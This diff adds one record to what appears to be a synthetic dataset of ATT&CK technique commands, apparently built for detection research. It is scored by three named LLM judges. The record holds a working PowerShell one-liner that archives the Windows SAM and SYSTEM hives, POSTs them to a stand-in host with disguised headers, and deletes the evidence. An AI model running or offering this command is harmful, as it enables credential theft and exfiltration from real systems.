@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $a=Join-Path $env:TEMP ('syscfg_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\config\\SAM','C:\\Windows\\System32\\config\\SYSTEM' -DestinationPath $a -Force; Invoke-WebRequest -Uri 'https://telemetry.example.com/upload/sys' -Method Post -InFile $a -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Host'=$env:COMPUTERNAME } -ErrorAction SilentlyContinue; Remove-Item $a -Force",
+  "explanation": "Archives SAM and SYSTEM hives and exfiltrates them via HTTPS POST using Invoke-WebRequest with benign-looking headers, suppressing progress output.",
+  "rationale_steps": [
+    "Bundle sensitive registry hive files requiring SYSTEM privileges.",
+    "POST the archive to a remote server using Invoke-WebRequest over HTTPS.",
+    "Set innocuous headers and suppress progress to reduce noise.",
+    "Remove the temporary archive to minimize local artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-bd2cc090",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid cmdlets/parameters, a correct hashtable for headers, and proper command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates archiving and HTTPS exfiltration with suppression and cleanup consistent with T1020, but accessing SAM/SYSTEM typically requires elevated rights so it may fail under the stated non-privileged context.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:29:55.018197Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper semicolon separators, valid parameter names and formats, and correct escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by compressing sensitive Windows registry hives (SAM and SYSTEM) into a temporary zip file, exfiltrating them via HTTPS POST with disguised headers, and cleaning up the evidence afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:29:58.343794Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell cmdlets, parameters, syntax, and balanced constructs throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly implements automated exfiltration logic, its primary objective of archiving SAM and SYSTEM hives will fail under 'None' privilege, as these files are protected and usually locked, preventing the creation of the intended archive for upload.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:30:15.658640Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
